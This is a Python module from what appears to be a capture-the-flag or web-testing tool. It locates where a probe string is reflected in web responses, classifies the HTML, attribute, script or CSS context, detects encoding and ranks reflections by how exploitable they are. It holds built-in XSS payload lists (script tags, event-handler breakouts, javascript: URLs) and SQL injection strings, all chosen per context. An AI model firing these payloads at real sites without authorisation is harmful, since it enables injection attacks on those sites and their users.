"""Context analyzer for identifying input reflection points."""

import re
import html
from dataclasses import dataclass, field
from typing import Optional
from enum import Enum


class ReflectionType(Enum):
    """Types of reflection contexts."""
    HTML_TEXT = "html_text"  # Between tags: <div>REFLECTION</div>
    HTML_ATTRIBUTE = "html_attribute"  # In attribute: <input value="REFLECTION">
    HTML_ATTRIBUTE_UNQUOTED = "html_attribute_unquoted"  # <input value=REFLECTION>
    JAVASCRIPT = "javascript"  # In JS: var x = "REFLECTION";
    JAVASCRIPT_UNQUOTED = "javascript_unquoted"  # In JS: var x = REFLECTION;
    URL = "url"  # In URL context: href="http://...REFLECTION"
    CSS = "css"  # In CSS: style="background: REFLECTION"
    JSON = "json"  # In JSON: {"key": "REFLECTION"}
    XML = "xml"  # In XML context
    COMMENT = "comment"  # In HTML comment: <!-- REFLECTION -->
    SCRIPT_SRC = "script_src"  # In script src: <script src="REFLECTION">
    NONE = "none"  # No reflection found


@dataclass
class ReflectionContext:
    """Details about a single reflection."""
    context_type: ReflectionType
    position: int  # Position in response
    surrounding: str  # Text around reflection (for context)
    quote_char: Optional[str] = None  # Quote character used (", ', None)
    tag_name: Optional[str] = None  # HTML tag name if applicable
    attribute_name: Optional[str] = None  # Attribute name if applicable
    encoded: bool = False  # Whether input was HTML encoded
    url_encoded: bool = False  # Whether input was URL encoded
    js_escaped: bool = False  # Whether input was JS escaped
    breakout_chars: list[str] = field(default_factory=list)  # Chars needed to break out


@dataclass
class ContextAnalysisResult:
    """Result of context analysis."""
    reflections: list[ReflectionContext]
    unique_contexts: set[ReflectionType]
    most_exploitable: Optional[ReflectionContext]
    recommended_payloads: list[str]
    encoding_detected: dict[str, bool]


class ContextAnalyzer:
    """
    Analyzes where user input is reflected in responses.

    Used to:
    - Determine XSS context (HTML, JS, attribute, etc.)
    - Identify encoding/filtering
    - Recommend optimal payloads
    """

    # Unique probe to identify reflections
    PROBE_MARKER = "CTF_PROBE_7x9k2m"
    SPECIAL_PROBE = "CTF<>\"'`/\\;PROBE"  # Tests encoding of special chars

    # Context detection patterns
    PATTERNS = {
        "html_comment": re.compile(r'<!--[^>]*?' + PROBE_MARKER + r'[^>]*?-->', re.DOTALL),
        "script_block": re.compile(r'<script[^>]*>.*?' + PROBE_MARKER + r'.*?</script>', re.DOTALL | re.IGNORECASE),
        "style_block": re.compile(r'<style[^>]*>.*?' + PROBE_MARKER + r'.*?</style>', re.DOTALL | re.IGNORECASE),
        "attribute_double": re.compile(r'<[a-z][^>]*\s+\w+="[^"]*?' + PROBE_MARKER + r'[^"]*?"', re.IGNORECASE),
        "attribute_single": re.compile(r"<[a-z][^>]*\s+\w+='[^']*?" + PROBE_MARKER + r"[^']*?'", re.IGNORECASE),
        "attribute_unquoted": re.compile(r'<[a-z][^>]*\s+\w+=' + PROBE_MARKER + r'[\s>]', re.IGNORECASE),
        "tag_content": re.compile(r'>[^<]*?' + PROBE_MARKER + r'[^<]*?<', re.DOTALL),
    }

    # XSS payload templates by context
    XSS_PAYLOADS = {
        ReflectionType.HTML_TEXT: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
        ],
        ReflectionType.HTML_ATTRIBUTE: [
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            '" autofocus onfocus="alert(1)',
            "\" onclick=\"alert(1)\" x=\"",
        ],
        ReflectionType.HTML_ATTRIBUTE_UNQUOTED: [
            " onmouseover=alert(1) ",
            " autofocus onfocus=alert(1) ",
            "><script>alert(1)</script>",
        ],
        ReflectionType.JAVASCRIPT: [
            "';alert(1);//",
            '";alert(1);//',
            "</script><script>alert(1)</script>",
            "'-alert(1)-'",
        ],
        ReflectionType.JAVASCRIPT_UNQUOTED: [
            ";alert(1);//",
            "-alert(1)-",
            "1;alert(1)",
        ],
        ReflectionType.URL: [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "' onclick='alert(1)",
        ],
        ReflectionType.CSS: [
            "expression(alert(1))",
            "url(javascript:alert(1))",
            "}</style><script>alert(1)</script>",
        ],
        ReflectionType.COMMENT: [
            "--><script>alert(1)</script><!--",
            "-->\"'><script>alert(1)</script>",
        ],
    }

    # SQLi payloads by context
    SQLI_PAYLOADS = {
        "string_single": [
            "' OR '1'='1",
            "' AND '1'='1'--",
            "' UNION SELECT NULL--",
        ],
        "string_double": [
            '" OR "1"="1',
            '" AND "1"="1"--',
        ],
        "numeric": [
            " OR 1=1",
            " AND 1=1--",
            " UNION SELECT NULL--",
        ],
    }

    def __init__(self):
        """Initialize context analyzer."""
        pass

    def analyze_reflection(
        self,
        response_text: str,
        probe: str = PROBE_MARKER
    ) -> ContextAnalysisResult:
        """
        Analyze where probe is reflected in response.

        Args:
            response_text: Full response text
            probe: The probe string to search for

        Returns:
            ContextAnalysisResult with all reflection details
        """
        reflections = []
        probe_lower = probe.lower()
        text_lower = response_text.lower()

        # Find all occurrences
        pos = 0
        while True:
            pos = text_lower.find(probe_lower, pos)
            if pos == -1:
                break

            # Get surrounding context (200 chars each side)
            start = max(0, pos - 200)
            end = min(len(response_text), pos + len(probe) + 200)
            surrounding = response_text[start:end]

            # Determine context type
            context = self._determine_context(response_text, pos, probe, surrounding)
            reflections.append(context)

            pos += 1

        # Analyze encoding by checking special probe
        encoding_detected = self._detect_encoding(response_text, probe)

        # Get unique contexts
        unique_contexts = {r.context_type for r in reflections}

        # Find most exploitable
        most_exploitable = self._find_most_exploitable(reflections)

        # Get recommended payloads
        recommended = self._get_recommended_payloads(reflections, encoding_detected)

        return ContextAnalysisResult(
            reflections=reflections,
            unique_contexts=unique_contexts,
            most_exploitable=most_exploitable,
            recommended_payloads=recommended,
            encoding_detected=encoding_detected,
        )

    def _determine_context(
        self,
        full_text: str,
        position: int,
        probe: str,
        surrounding: str
    ) -> ReflectionContext:
        """Determine the context type at a specific position."""
        # Check if in HTML comment
        if self._is_in_comment(full_text, position):
            return ReflectionContext(
                context_type=ReflectionType.COMMENT,
                position=position,
                surrounding=surrounding,
                breakout_chars=["-->"],
            )

        # Check if in script block
        script_context = self._check_script_context(full_text, position, surrounding)
        if script_context:
            return script_context

        # Check if in style block
        if self._is_in_style(full_text, position):
            return ReflectionContext(
                context_type=ReflectionType.CSS,
                position=position,
                surrounding=surrounding,
                breakout_chars=["</style>", "}"],
            )

        # Check if in attribute
        attr_context = self._check_attribute_context(full_text, position, surrounding)
        if attr_context:
            return attr_context

        # Check if in tag content (between > and <)
        if self._is_in_tag_content(full_text, position):
            return ReflectionContext(
                context_type=ReflectionType.HTML_TEXT,
                position=position,
                surrounding=surrounding,
                breakout_chars=["<"],
            )

        # Default to HTML text
        return ReflectionContext(
            context_type=ReflectionType.HTML_TEXT,
            position=position,
            surrounding=surrounding,
        )

    def _is_in_comment(self, text: str, position: int) -> bool:
        """Check if position is inside HTML comment."""
        # Find last <!-- before position
        comment_start = text.rfind("<!--", 0, position)
        if comment_start == -1:
            return False

        # Check if --> exists between comment_start and position
        comment_end = text.find("-->", comment_start, position)
        return comment_end == -1

    def _is_in_style(self, text: str, position: int) -> bool:
        """Check if position is inside style block."""
        # Find last <style before position
        style_start = text.lower().rfind("<style", 0, position)
        if style_start == -1:
            return False

        # Check if </style> exists between style_start and position
        style_end = text.lower().find("</style>", style_start, position)
        return style_end == -1

    def _check_script_context(
        self,
        text: str,
        position: int,
        surrounding: str
    ) -> Optional[ReflectionContext]:
        """Check if in JavaScript context and determine quote type."""
        text_lower = text.lower()

        # Find last <script before position
        script_start = text_lower.rfind("<script", 0, position)
        if script_start == -1:
            return None

        # Check if </script> exists between script_start and position
        script_end = text_lower.find("</script>", script_start, position)
        if script_end != -1:
            return None

        # We're inside a script block - determine if in string
        script_content = text[script_start:position]

        # Count quotes to determine if we're in a string
        single_quotes = script_content.count("'") - script_content.count("\\'")
        double_quotes = script_content.count('"') - script_content.count('\\"')

        if single_quotes % 2 == 1:
            return ReflectionContext(
                context_type=ReflectionType.JAVASCRIPT,
                position=position,
                surrounding=surrounding,
                quote_char="'",
                breakout_chars=["'", "</script>"],
            )
        elif double_quotes % 2 == 1:
            return ReflectionContext(
                context_type=ReflectionType.JAVASCRIPT,
                position=position,
                surrounding=surrounding,
                quote_char='"',
                breakout_chars=['"', "</script>"],
            )
        else:
            return ReflectionContext(
                context_type=ReflectionType.JAVASCRIPT_UNQUOTED,
                position=position,
                surrounding=surrounding,
                breakout_chars=["</script>", ";"],
            )

    def _check_attribute_context(
        self,
        text: str,
        position: int,
        surrounding: str
    ) -> Optional[ReflectionContext]:
        """Check if in HTML attribute context."""
        # Look backwards for attribute pattern
        search_start = max(0, position - 100)
        before = text[search_start:position]

        # Pattern: attr="value or attr='value or attr=value
        double_quote_match = re.search(r'(\w+)="([^"]*?)$', before)
        single_quote_match = re.search(r"(\w+)='([^']*?)$", before)
        unquoted_match = re.search(r'(\w+)=(\S*)$', before)

        if double_quote_match:
            attr_name = double_quote_match.group(1)
            return ReflectionContext(
                context_type=ReflectionType.HTML_ATTRIBUTE,
                position=position,
                surrounding=surrounding,
                quote_char='"',
                attribute_name=attr_name,
                breakout_chars=['"'],
            )
        elif single_quote_match:
            attr_name = single_quote_match.group(1)
            return ReflectionContext(
                context_type=ReflectionType.HTML_ATTRIBUTE,
                position=position,
                surrounding=surrounding,
                quote_char="'",
                attribute_name=attr_name,
                breakout_chars=["'"],
            )
        elif unquoted_match:
            attr_name = unquoted_match.group(1)
            # Check if it's a URL attribute
            if attr_name.lower() in ["href", "src", "action", "formaction"]:
                return ReflectionContext(
                    context_type=ReflectionType.URL,
                    position=position,
                    surrounding=surrounding,
                    attribute_name=attr_name,
                    breakout_chars=[" ", ">"],
                )
            return ReflectionContext(
                context_type=ReflectionType.HTML_ATTRIBUTE_UNQUOTED,
                position=position,
                surrounding=surrounding,
                attribute_name=attr_name,
                breakout_chars=[" ", ">"],
            )

        return None

    def _is_in_tag_content(self, text: str, position: int) -> bool:
        """Check if position is between > and <."""
        # Find nearest < and > before position
        last_lt = text.rfind("<", 0, position)
        last_gt = text.rfind(">", 0, position)

        # If > is after <, we're in tag content
        return last_gt > last_lt

    def _detect_encoding(self, response_text: str, probe: str) -> dict[str, bool]:
        """Detect what encoding is applied to input."""
        # Use special probe to check encoding
        special = self.SPECIAL_PROBE.replace("CTF", "").replace("PROBE", "")

        result = {
            "html_encoded": False,
            "url_encoded": False,
            "js_escaped": False,
            "double_encoded": False,
        }

        # Check if < became &lt;
        if "&lt;" in response_text or "&gt;" in response_text:
            result["html_encoded"] = True

        # Check if ' became &#39; or &apos;
        if "&#39;" in response_text or "&apos;" in response_text or "&#x27;" in response_text:
            result["html_encoded"] = True

        # Check if " became &quot;
        if "&quot;" in response_text or "&#34;" in response_text:
            result["html_encoded"] = True

        # Check for URL encoding
        if "%3C" in response_text or "%3E" in response_text:
            result["url_encoded"] = True

        # Check for JS escaping
        if "\\'" in response_text or '\\"' in response_text:
            result["js_escaped"] = True

        # Check for double encoding
        if "%253C" in response_text or "&amp;lt;" in response_text:
            result["double_encoded"] = True

        return result

    def _find_most_exploitable(
        self,
        reflections: list[ReflectionContext]
    ) -> Optional[ReflectionContext]:
        """Find the most exploitable reflection context."""
        # Priority order (higher = more exploitable)
        priority = {
            ReflectionType.HTML_TEXT: 10,
            ReflectionType.HTML_ATTRIBUTE_UNQUOTED: 9,
            ReflectionType.HTML_ATTRIBUTE: 8,
            ReflectionType.JAVASCRIPT_UNQUOTED: 7,
            ReflectionType.JAVASCRIPT: 6,
            ReflectionType.URL: 5,
            ReflectionType.CSS: 4,
            ReflectionType.COMMENT: 3,
            ReflectionType.JSON: 2,
            ReflectionType.XML: 1,
            ReflectionType.NONE: 0,
        }

        if not reflections:
            return None

        return max(reflections, key=lambda r: priority.get(r.context_type, 0))

    def _get_recommended_payloads(
        self,
        reflections: list[ReflectionContext],
        encoding: dict[str, bool]
    ) -> list[str]:
        """Get recommended payloads based on context and encoding."""
        payloads = []

        for reflection in reflections:
            context_payloads = self.XSS_PAYLOADS.get(reflection.context_type, [])

            for payload in context_payloads:
                # Adjust payload based on encoding
                adjusted = payload

                if encoding.get("html_encoded"):
                    # Try to bypass with different vectors
                    if "<" in payload:
                        # Can't use tags if < is encoded
                        continue

                if encoding.get("js_escaped") and reflection.context_type in [
                    ReflectionType.JAVASCRIPT,
                    ReflectionType.JAVASCRIPT_UNQUOTED
                ]:
                    # Try to bypass JS escaping
                    adjusted = payload.replace("'", "\\'").replace('"', '\\"')

                payloads.append(adjusted)

        # Remove duplicates while preserving order
        seen = set()
        unique = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique.append(p)

        return unique[:20]  # Return top 20

    def get_optimal_payloads(
        self,
        contexts: list[ReflectionContext],
        attack_type: str = "xss",
        max_count: int = 10
    ) -> list[str]:
        """
        Get optimal payloads for given contexts.

        Args:
            contexts: List of reflection contexts
            attack_type: Type of attack (xss, sqli)
            max_count: Maximum payloads to return

        Returns:
            List of recommended payloads
        """
        if attack_type == "xss":
            payloads = []
            for ctx in contexts:
                payloads.extend(self.XSS_PAYLOADS.get(ctx.context_type, []))
            return list(dict.fromkeys(payloads))[:max_count]

        elif attack_type == "sqli":
            payloads = []
            for ctx in contexts:
                if ctx.quote_char == "'":
                    payloads.extend(self.SQLI_PAYLOADS["string_single"])
                elif ctx.quote_char == '"':
                    payloads.extend(self.SQLI_PAYLOADS["string_double"])
                else:
                    payloads.extend(self.SQLI_PAYLOADS["numeric"])
            return list(dict.fromkeys(payloads))[:max_count]

        return []

    @staticmethod
    def html_encode_check(original: str, reflected: str) -> bool:
        """Check if reflected value is HTML encoded version of original."""
        encoded = html.escape(original)
        return encoded in reflected or original not in reflected
